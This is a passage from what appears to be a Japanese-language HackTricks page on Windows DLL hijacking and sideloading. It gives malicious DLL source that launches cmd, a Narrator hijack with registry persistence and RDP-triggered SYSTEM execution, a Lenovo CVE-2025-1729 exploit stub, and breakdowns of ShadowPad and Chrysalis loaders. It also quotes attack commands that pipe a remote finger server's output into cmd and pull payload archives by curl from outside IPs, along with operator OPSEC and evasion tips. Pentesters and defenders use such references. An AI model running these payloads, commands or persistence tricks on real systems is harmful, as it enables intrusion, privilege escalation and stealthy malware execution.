  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>スレッドエントリを備えた代替C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (アクセシビリティ/支援技術)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き検索します。この DLL を hijack すると、任意のコード実行と永続化が可能です。<sup>[[7]](#references)</sup>

主な事実
- 検索パス (現行ビルド): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- 旧パス (古いビルド): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore パスに攻撃者が制御する書き込み可能な DLL が存在すると、その DLL がロードされ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Procmon での検出
- フィルター: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記パスへのロード試行を確認します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSECでの静音化
- 単純な hijack は UI 上で発話や強調表示が発生します。目立たないようにするには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）、`SuspendThread` で一時停止します。処理は自分のスレッドで続行します。完全なコードは PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility の設定による起動と永続化
- ユーザーコンテキスト（HKCU）: `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に設置した DLL がロードされます。セキュアデスクトップ（ログオン画面）で CTRL+WIN+ENTER を押すと Narrator が起動し、DLL がセキュアデスクトップ上で SYSTEM として実行されます。

RDP をトリガーとする SYSTEM 実行（ラテラルムーブメント）
- 従来の RDP セキュリティ層を許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動します。DLL がセキュアデスクトップ上で SYSTEM として実行されます。
- RDP セッションが閉じると実行は停止するため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool（AT）のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すように編集してインポートした後、`configuration` にその AT 名を設定できます。これにより、Accessibility フレームワーク経由で任意のコードを実行できます。

注意事項
- `%windir%\System32` への書き込みと HKLM 値の変更には管理者権限が必要です。
- ペイロードのロジックはすべて `DLL_PROCESS_ATTACH` に記述できます。exports は必要ありません。

## 事例: CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格

この事例では、Lenovo の TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を紹介します。これは **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### 脆弱性の詳細

- **コンポーネント**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中のユーザーのコンテキストで毎日午前9時30分に実行されます。
- **ディレクトリのアクセス許可**: `CREATOR OWNER` が書き込み可能なため、ローカルユーザーは任意のファイルを配置できます。
- **DLL の検索動作**: 最初に作業ディレクトリから `hostfxr.dll` のロードを試み、見つからない場合に "NAME NOT FOUND" を記録します。これは、ローカルディレクトリが検索で優先されることを示しています。

### Exploit の実装

攻撃者は同じディレクトリに悪意のある `hostfxr.dll` スタブを配置し、存在しない DLL を悪用することで、ユーザーのコンテキストでコードを実行できます:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻撃フロー

1. 標準ユーザーとして、`C:\ProgramData\Lenovo\TPQM\Assistant\` に `hostfxr.dll` を配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるのを待ちます。
3. タスク実行時に管理者がログインしている場合、悪意のある DLL は管理者のセッションで medium integrity として実行されます。
4. 標準的な UAC bypass 手法を連鎖させ、medium integrity から SYSTEM 権限に昇格します。

## ケーススタディ: MSI CustomAction Dropper + 署名済みホスト (wsc_proxy.exe) を介した DLL Side-Loading

脅威アクターは、信頼された署名済みプロセスのもとで payload を実行するために、MSI ベースの dropper と DLL side-loading を組み合わせることがよくあります。<sup>[[10]](#references)</sup>

連鎖の概要
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction がサイレント実行され（例: LaunchApplication または VBScript アクション）、埋め込みリソースから次のステージを再構成します。
- dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（例: Avast 署名済みの wsc_proxy.exe と、攻撃者が制御する wsc.dll の組み合わせ）。
- 署名済み EXE が起動すると、Windows の DLL 検索順序により、まず作業ディレクトリから wsc.dll が読み込まれ、署名済みの親プロセスのもとで攻撃者のコードが実行されます (ATT&CK T1574.001)。

MSI 分析（調査する箇所）
- CustomAction テーブル:
  - 実行ファイルまたは VBScript を実行するエントリを探します。疑わしいパターンの例: LaunchApplication が埋め込みファイルをバックグラウンドで実行する。
  - Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを調べます。
- MSI CAB 内の埋め込み・分割 payload:
  - 管理者用の展開: msiexec /a package.msi /qb TARGETDIR=C:\out
  - または lessmsi を使用: lessmsi x package.msi C:\out
  - VBScript CustomAction によって連結・復号される複数の小さな断片を探します。一般的な流れ:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exeを使った実践的なsideloading
- 次の2つのファイルを同じフォルダーに配置します:
  - wsc_proxy.exe: 正規の署名済みホスト (Avast)。このプロセスは、同じディレクトリから名前を指定してwsc.dllを読み込もうとします。
  - wsc.dll: 攻撃者のDLL。特定のexportが不要であれば、DllMainだけで十分です。必要な場合はproxy DLLを作成し、payloadをDllMainで実行しながら、必要なexportを本物のライブラリに転送します。
- 最小限のDLL payloadをビルドします:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- エクスポート要件がある場合は、proxying framework（例: DLLirant/Spartacus）を使って、payloadも実行するforwarding DLLを生成します。

- この手法は、ホストバイナリによるDLL名の解決に依存します。ホストが絶対パスや安全な読み込みフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackに失敗することがあります。
- KnownDLLs、SxS、forwarded exportsは優先順位に影響するため、ホストバイナリとexport setの選定時に考慮する必要があります。

## 署名済みtriad + 暗号化payload（ShadowPadのケーススタディ）

Check Pointは、Ink Dragonが**3ファイルのtriad**を使ってShadowPadを展開し、正規ソフトウェアに紛れ込ませながら、コアpayloadをディスク上で暗号化したままにする手法について説明しています:<sup>[[12]](#references)</sup>

1. **署名済みホストEXE** – AMD、Realtek、NVIDIAなどのベンダーが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前をWindowsバイナリに見えるもの（例: `conhost.exe`）に変更しますが、Authenticode署名は有効なままです。
2. **悪意のあるloader DLL** – EXEと同じ場所に、想定される名前で配置されます（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。このDLLは通常、ScatterBrain frameworkで難読化されたMFCバイナリです。役割は暗号化blobを見つけて復号し、ShadowPadをreflectively mapすることだけです。
3. **暗号化payload blob** – 多くの場合、同じディレクトリ内に`<name>.tmp`として保存されます。復号したpayloadをmemory-mapした後、loaderはTMPファイルを削除してフォレンジック上の証拠を消去します。

Tradecraftに関する注意事項:

* PE header内の元の`OriginalFileName`を維持したまま署名済みEXEの名前を変更すると、ベンダー署名を保ちつつWindowsバイナリを装えます。そのため、AMD/NVIDIAのユーティリティを実際の正体とする`conhost.exe`風のバイナリを配置するInk Dragonの手法を再現します。
* 実行ファイルは信頼されたままなので、多くのallowlisting制御を回避するには、悪意のあるDLLをその隣に配置するだけで済みます。loader DLLのカスタマイズに注力してください。署名済みの親プロセスは通常、そのまま実行できます。
* ShadowPadのdecryptorは、TMP blobがloaderと同じ場所にあり、memory mapping後にファイルをゼロ化できるよう書き込み可能であることを想定しています。payloadが読み込まれるまでディレクトリを書き込み可能な状態にしてください。メモリ上に読み込まれた後は、OPSECのためTMPファイルを安全に削除できます。

### LOLBAS stager + staged archive sideloadingチェーン（finger → tar/curl → WMI）

オペレーターはDLL sideloadingとLOLBASを組み合わせ、ディスク上に置くカスタムartifactを、信頼されたEXEの隣にある悪意のあるDLLだけにします:<sup>[[1]](#references)</sup>

- **リモートコマンドloader（Finger）:** Hidden PowerShellが`cmd.exe /c`を起動し、Finger serverからコマンドを取得して`cmd`にパイプします:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` は TCP/79 のテキストを取得します。`| cmd` はサーバーからの応答を実行するため、オペレーターはサーバー側で second stage を切り替えられます。

- **組み込みのダウンロード／展開:** 無害な拡張子を付けたアーカイブをダウンロードして展開し、ランダムな `%LocalAppData%` フォルダーに sideload の対象と DLL を配置します。

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` は進捗を非表示にしてリダイレクトに従い、`tar -xf` は Windows 標準の tar を使用します。

- **WMI/CIM launch:** WMI 経由で EXE を起動し、同じ場所に配置された DLL の読み込み時に、テレメトリ上で CIM によって作成されたプロセスとして記録されるようにします：

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - ローカル DLL を優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で動作し、payload（例: Remcos）は信頼された名前で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に指定された `forfiles` を検知する。管理者スクリプト以外では珍しい。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom の侵入では、信頼された更新チェーンを悪用し、NSIS でパックされた dropper を配布して DLL sideload と完全にメモリ内で実行される payload を展開した。<sup>[[13]](#references)</sup>

攻撃手順
- `update.exe`（NSIS）が `%AppData%\Bluetooth` を作成して **HIDDEN** に設定し、名前を変更した Bitdefender Submission Wizard の `BluetoothService.exe`、悪意のある `log.dll`、暗号化 blob `BluetoothService` を配置した後、EXE を起動する。
- ホスト EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼び出す。`LogInit` は blob を mmap で読み込む。`LogWrite` はカスタム LCG ベースのストリーム暗号（定数 **0x19660D** / **0x3C6EF35F**、鍵素材は以前の hash から導出）で復号し、バッファを平文の shellcode で上書きして一時データを解放し、shellcode へジャンプする。
- IAT を回避するため、loader は **FNV-1a basis 0x811C9DC5 + prime 0x1000193** を使って export 名を hash し、Murmur 風の avalanche（**0x85EBCA6B**）を適用して、salt 付きのターゲット hash と照合する。

メイン shellcode（Chrysalis）
- 鍵 `gQ2JR&9;` を使った加算/XOR/減算を 5 回繰り返し、PE に似たメインモジュールを復号する。その後、`Kernel32.dll` → `GetProcAddress` を動的に読み込み、import 解決を完了する。
- 文字ごとの bit-rotate/XOR 変換で DLL 名の文字列を実行時に再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を読み込む。
- 2 つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4 バイト単位で解析して Murmur 風の mixing を行う。hash が見つからない場合に限り、`GetProcAddress` にフォールバックする。

埋め込み設定と C2
- 設定は配置された `BluetoothService` ファイル内の **offset 0x30808**（size **0x980**）にあり、鍵 `qwhvb^435h&*7` で RC4 復号すると C2 URL と User-Agent が得られる。
- beacon はドット区切りの host profile を作成して tag `4Q` を先頭に付け、鍵 `vAuig34%^325hGV` で RC4 暗号化してから、HTTPS 経由で `HttpSendRequestA` を実行する。応答は RC4 復号され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）に従って処理される。
- 実行モードは CLI 引数で制御される。引数なしでは `-i` を指す persistence（service/Run key）をインストールし、`-i` は自身を `-k` 付きで再起動する。`-k` はインストールを省略して payload を実行する。

確認された別の loader
- 同じ侵入では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `libtcc.dll` を隣に置いた状態で `svchost.exe -nostdlib -run conf.c` を実行した。攻撃者が用意した C source に shellcode が埋め込まれており、PE をディスクに書き込まず、メモリ内でコンパイルして実行した。次のように再現できる:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- この TCC ベースのコンパイル・実行ステージは、実行時に `Wininet.dll` をインポートし、ハードコードされた URL から第2段階の shellcode を取得することで、コンパイラの実行を装う柔軟な loader を実現していました。

## Signed-host sideloading with export proxying + host thread parking

一部の DLL sideloading チェーンでは、**安定性を高める工夫**が加えられています。これにより、悪意のある DLL のロード後にクラッシュすることなく、正規の host が後続のステージを正常にロードできるだけの時間、動作し続けます。<sup>[[11]](#references)</sup>

観測されたパターン
- 信頼された EXE を、`version.dll` のような想定される依存関係名を持つ悪意のある DLL と同じ場所に配置する。
- 悪意のある DLL は、想定されるすべての export を実際のシステム DLL（例: `%SystemRoot%\\System32\\version.dll`）に**プロキシ**する。これにより import の解決が成功し、host プロセスは動作を続ける。
- ロード後、悪意のある DLL は host の entry point にパッチを適用し、メインスレッドがプロセスを終了させる代わりに、無限の `Sleep` ループに入るようにする。
- 新しいスレッドが実際の悪意ある処理を実行する。次段階の DLL 名やパスを復号（RC4/XOR がよく使われる）し、`LoadLibrary` で起動する。

重要性
- 通常の DLL proxying は API 互換性を保ちますが、後続のステージが動作するだけの時間、host が生存する保証はありません。
- メインスレッドを `Sleep(INFINITE)` で待機させるのは、worker thread が復号、ステージング、またはネットワークの bootstrap を行う間、署名済みプロセスを常駐させる簡単な方法です。
- 不審な `DllMain` だけを探していると、host の entry point へのパッチ適用後に興味深い動作が発生し、2つ目のスレッドが起動するこのパターンを見逃す可能性があります。

最小限のワークフロー
1. 署名済み host EXE をコピーし、ローカルディレクトリから解決される DLL を特定する。
2. 同じ関数を export し、正規の DLL に転送する proxy DLL を作成する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. そのスレッドから host の entry point またはメインスレッドの開始ルーチンにパッチを適用し、`Sleep` ループに入るようにする。
5. 次段階の DLL 名や config を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

防御のための着眼点
- `version.dll` などの一般的なライブラリを、`System32` ではなくアプリケーションディレクトリから読み込む署名済みプロセス。
- イメージのロード直後に発生するプロセス entry point へのメモリパッチ。特に、`Sleep`/`SleepEx` にリダイレクトする jump/call。
- proxy DLL が作成したスレッドが、復号された名前を持つ2つ目の DLL に対して直ちに `LoadLibrary` を呼び出す動作。
- `ProgramData`、`%TEMP%`、展開されたアーカイブのパスなど、書き込み可能な staging ディレクトリ内で、ベンダーの実行ファイルの隣に配置された全 export 対応の proxy DLL。

## References

- [1] [Red Canary – 2026年1月: インテリジェンスの洞察](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows における DLL hijacking: シンプルな C の例](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore、新たな malware を展開して欧州を標的に](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack と Windows ヘルパーの遭遇](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – デジタルな分身: Gh0st RAT を配布する、進化するなりすましキャンペーンの分析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利害の収束: 東南アジア政府を標的とする脅威クラスターの分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon の内部: ステルス性の高い攻撃作戦におけるリレーネットワークと内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom のツールキットを詳しく解説](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack チェーン](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – イランの APT Screening Serpens による2026年の諜報キャンペーンを追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 猛進: イラン紛争中の Nimbus Manticore の作戦](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062、東南アジアの政府機関と重要インフラを標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – 正規ソフトウェアに埋め込まれた SectopRAT variant を解明](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
